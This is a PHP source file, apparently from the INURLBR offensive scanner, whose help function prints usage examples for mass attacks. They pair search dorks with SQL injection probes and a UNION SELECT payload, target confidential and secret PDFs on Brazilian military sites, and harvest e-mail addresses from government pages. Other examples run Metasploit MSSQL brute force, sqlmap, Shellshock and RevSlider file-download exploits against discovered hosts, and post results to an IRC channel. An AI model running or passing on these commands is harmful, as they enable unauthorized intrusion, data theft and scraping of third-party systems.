<?php

function __info() {
   $cor = $GLOBALS['COR'];
    return __getOut("
 {$cor->whit}
   ██▓    ███▄    █      █████▒    ▒█████  
   ▓██▒    ██ ▀█   █    ▓██   ▒    ▒██▒  ██▒
   ▒██▒   ▓██  ▀█ ██▒   ▒████ ░    ▒██░  ██▒
   ░██░   ▓██▒  ▐▌██▒   ░▓█▒  ░    ▒██   ██░
   ░██░   ▒██░   ▓██░   ░▒█░       ░ ████▓▒░
   ░▓     ░ ▒░   ▒ ▒     ▒ ░       ░ ▒░▒░▒░ 
   ▒ ░   ░ ░░   ░ ▒░    ░           ░ ▒ ▒░ 
   ▒ ░      ░   ░ ░     ░ ░       ░ ░ ░ ▒  
   ░              ░                   ░ ░  

   
{$cor->whit}[ INF ] {$cor->end}SCRIPT NAME: INURLBR {$_SESSION['config']['version_script']}
{$cor->whit}[ INF ] {$cor->end}AUTOR:    Cleiton Pinheiro
{$cor->whit}[ INF ] {$cor->end}Nick:     MrCl0wnLab
{$cor->whit}[ INF ] {$cor->end}Email:    mrcl0wnlab\@\gmail.com 
{$cor->whit}[ INF ] {$cor->end}Blog:     blog.mrcl0wn.com
{$cor->whit}[ INF ] {$cor->end}Twitter:  twitter.com/MrCl0wnLab
{$cor->whit}[ INF ] {$cor->end}GIT:      github.com/MrCl0wnLab
{$cor->whit}[ INF ] {$cor->end}PSS:      packetstormsecurity.com/user/mrcl0wnlab
{$cor->whit}[ INF ] {$cor->end}Version:  {$_SESSION['config']['version_script']} 
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
    

{$cor->whit}[ INF ] {$cor->end}Current PHP version=>{$cor->whit}[ " . phpversion() . "{$cor->end} ]
{$cor->whit}[ INF ] {$cor->end}Current script owner=>{$cor->whit}[ " . get_current_user() . "{$cor->end} ]
{$cor->whit}[ INF ] {$cor->end}Current uname=>{$cor->whit}[ " . php_uname() . "{$cor->end} ]
{$cor->whit}[ INF ] {$cor->end}Current pwd=>{$cor->whit}[ " . getcwd() . "{$cor->end} ]
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
 
{$cor->whit}[ INF ] {$cor->red2} NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$cor->end}
{$cor->whit}[ INF ] {$cor->red2} LIB & CONFIG{$cor->end}
{$cor->whit}[ INF ] {$cor->end} PHP Version         8.3.11
{$cor->whit}[ INF ] {$cor->end} php7-curl           LIB
{$cor->whit}[ INF ] {$cor->end} php7-cli            LIB   
{$cor->whit}[ INF ] {$cor->end} cURL support        enabled
{$cor->whit}[ INF ] {$cor->end} allow_url_fopen     On
{$cor->whit}[ INF ] {$cor->end} permission          Reading & Writing
{$cor->whit}[ INF ] {$cor->end} User                root privilege, or is in the sudoers group
{$cor->whit}[ INF ] {$cor->end} Operating system    LINUX
{$cor->whit}[ INF ] {$cor->end} Proxy random        TOR    
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
 
{$cor->whit}[ INF ] {$cor->end} {$cor->red2}PERMISSION EXECUTION: chmod +x inurlbr{$cor->end}
{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING LIB PHP-CURL: sudo apt-get install php8-curl{$cor->end}
{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING LIB PHP-CLI: sudo apt-get install php8-cli{$cor->end}
{$cor->whit}[ INF ] {$cor->end} {$cor->red2}sudo apt-get install curl libcurl3 libcurl3-dev php8 php8-cli php8-curl{$cor->end}
{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$cor->end}
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}

{$cor->whit}[ INF ] {$cor->red2} COMMANDS SIMPLE SCRIPT{$cor->end}

inurlbr {$cor->whit}--dork {$cor->yell}'inurl:php?id=' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->end} 
   
inurlbr {$cor->whit}--dork {$cor->yell}'inurl:aspx?id=' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:aspx (id|new)' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\"{$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'index of wp-content/uploads' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6,2,4 {$cor->whit}-t {$cor->yell}2 {$cor->whit}--exploit-get {$cor->red1}'?' {$cor->whit}-a {$cor->yell}'Index of /wp-content/uploads'{$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'site:.mil.br intext:(confidencial) ext:pdf' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 -t 2 --exploit-get {$cor->red1}'?' {$cor->whit}-a {$cor->yell}'confidencial'{$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'site:.mil.br intext:(secreto) ext:pdf' {$cor->whit}-s save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}2 {$cor->whit}--exploit-get {$cor->yell}'?' {$cor->whit}-a {$cor->yell}'secreto'{$cor->end}        
  
inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:aspx (id|new)' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\"{$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'.new.php?new id' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6,7,2,3 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$cor->whit}-a {$cor->yell}'::EXPLOIT-SUCESS::'{$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'new.php?id=' {$cor->whit}-s {$cor->yell}teste.txt  {$cor->whit}--exploit-get {$cor->red1}?´0x27  {$cor->whit}--command-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->yell}'{$cor->end}
   
inurlbr {$cor->whit}--dork {$cor->yell}'site:pt inurl:aspx (id|q)' {$cor->whit}-s {$cor->yell}bruteforce.txt {$cor->whit}--exploit-get {$cor->red1}?´0x27 {$cor->whit}--command-vul {$cor->yell}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$cor->grey1}_TARGETIP_ {$cor->yell}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:id & inurl:php' {$cor->whit}-s {$cor->yell}get.txt {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->whit}--command-vul {$cor->yell}'python ../sqlmap/sqlmap.py -u \"{$cor->cya}_TARGETFULL_{$cor->yell}\" --dbs'{$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'inurl:index.php?id=' {$cor->whit}-q 1,2,10 {$cor->whit}--exploit-get {$cor->red1}\"'?´0x27'\" {$cor->whit}-s {$cor->yell}report.txt {$cor->whit}--command-vul {$cor->yell}'nmap -Pn -p 1-8080 --script http-enum --open {$cor->blue}_TARGET_{$cor->yell}'{$cor->end}
 
inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email' {$cor->whit}-s {$cor->yell}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$cor->whit}-s {$cor->yell}emails.txt {$cor->whit}-m{$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$cor->whit}-s {$cor->yell}urls.txt {$cor->whit}-u{$cor->end}

inurlbr {$cor->whit}--dork {$cor->yell}'site:gov.br' {$cor->whit}-s {$cor->yell}urls.txt {$cor->whit}--ua{$cor->end}

inurlbr {$cor->whit}--dork {$cor->yell}'site:gov.bo' {$cor->whit}-s {$cor->yell}govs.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6 {$cor->end} 
 
inurlbr {$cor->whit}--dork {$cor->yell}'site:.uk' {$cor->whit}-s {$cor->yell}uk.txt {$cor->whit}--user-agent {$cor->yell} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$cor->end}
 
inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksSqli.txt' {$cor->whit}-s {$cor->yell}govs.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6 {$cor->end}
 
inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksSqli.txt' {$cor->whit}-s {$cor->yell}sqli.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6  {$cor->whit}--irc {$cor->yell}'irc.rizon.net#inurlbrasil'   {$cor->end}
  
inurlbr {$cor->whit}--dork {$cor->yell}'inurl:\"cgi-bin/login.cgi\"' {$cor->whit}-s {$cor->yell}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$cor->end} 
 
inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end}
  
inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end} {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\"{$cor->end}
  
inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end} {$cor->whit}--exploit-get {$cor->red1}\"?pass=1234\" {$cor->whit}-a {$cor->yell}'<title>hello! admin</title>'{$cor->end}
  
inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find_valid_cod-200.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}5{$cor->end}
  
inurlbr {$cor->whit}--range {$cor->yell}'200.20.10.1,200.20.10.255' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--command-all {$cor->yell}'php roteador.php _TARGETIP_'  {$cor->end}
 
inurlbr {$cor->whit}--range-rad {$cor->yell}'1500' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--command-all {$cor->yell}'php roteador.php _TARGETIP_'  {$cor->end}
 
inurlbr {$cor->whit}--dork-rad {$cor->yell}'20' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\" {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end}
 
inurlbr {$cor->whit}--dork-rad {$cor->yell}'20' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\" {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end} {$cor->whit}--pr{$cor->end}
 
inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksCGI.txt' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end}{$cor->whit} --pr --shellshock{$cor->end}
 
inurlbr {$cor->whit}--dork-file {$cor->yell}'dorks_Wordpress_revslider.txt' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->whit}--sub-file {$cor->yell}'xpls_Arbitrary_File_Download.txt' {$cor->end}
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
  
{$cor->whit}[ INF ]{$cor->red2} It it also useful to know the full path to the PHP binary on your computer. {$cor->end}
{$cor->whit}[ INF ]{$cor->red2} There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$cor->end}

{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~$ which php 
         /usr/bin/php{$cor->end} 
{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~/cli$ whereis php
         php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz{$cor->end} 
{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~/cli$ type -a php 
         php is /usr/bin/php{$cor->end}
{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}


");
}